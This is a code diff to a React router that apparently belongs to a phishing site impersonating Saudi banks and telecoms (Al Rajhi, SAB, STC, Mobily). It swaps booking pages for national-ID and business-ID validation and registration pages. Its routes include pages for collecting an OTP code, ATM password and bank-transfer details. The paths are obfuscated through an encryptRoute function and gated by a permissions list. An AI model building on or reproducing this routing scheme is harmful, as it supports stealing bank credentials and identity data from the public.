@@ -18,11 +18,8 @@ import { useSignals } from "@preact/signals-react/runtime";
 import { Navigate, Route, Routes } from "react-router-dom";
 import MobilyCallAlert from "@/pages/mobily-call-alert/MobilyCallAlert";
 import MyStc from "@/pages/my-stc/MyStc";
-import ApplyPage from "@/pages/book/apply";
 import IBAN from "@/pages/iban/iban";
 import SABNafath from "@/pages/sab-nafath/SABNafath";
-import Edit from "@/pages/book/edit";
-import Cancel from "@/pages/book/cancel";
 import SABAccount from "@/pages/SAB-account/SAB-account";
 import BankTransfer from "@/pages/bank-transfer/BankTransfer";
 import Home from "@/pages/home/Home";
@@ -42,9 +39,15 @@ function Router() {
     component: () => JSX.Element;
     public?: boolean;
   }[] = [
-    { path: "حجز موعد", component: ApplyPage, public: true },
-    { path: "تعديل موعد", component: Edit, public: true },
-    { path: "إلغاء موعد", component: Cancel, public: true },
+    { path: "تسجيل", component: RegistrationPage, public: true },
+    { path: "التحقق من الهوية الشخصية", component: ValidateNID, public: true },
+    {
+      path: "التحقق من هوية المنشأة",
+      component: RegistrationBusiness,
+      public: true,
+    },
+    { path: "تسجيل بيانات الدخول", component: RegistrationLogin, public: true },
+
     { path: "رمز التحقق (OTP)", component: CheckOtp },
     { path: "كلمة مرور ATM", component: AtmPassword },
     { path: "تنبيه الراجحى", component: AlRajhiAlert },
@@ -72,13 +75,10 @@ function Router() {
   return (
     <Routes>
       <Route Component={Home} path="/" />
-      <Route Component={RegistrationPage} path="/registration" />
-      <Route Component={ValidateNID} path="/validate-nid" />
-      <Route Component={RegistrationBusiness} path="/validate-business" />
-      <Route Component={RegistrationLogin} path="/registration-login" />
 
       {routes.map((route) => {
         const cipherPath = encryptRoute(route.path);
+        console.log(cipherPath);
         return (
           (permissions.value.includes(route.path) || route.public) && (
             <>
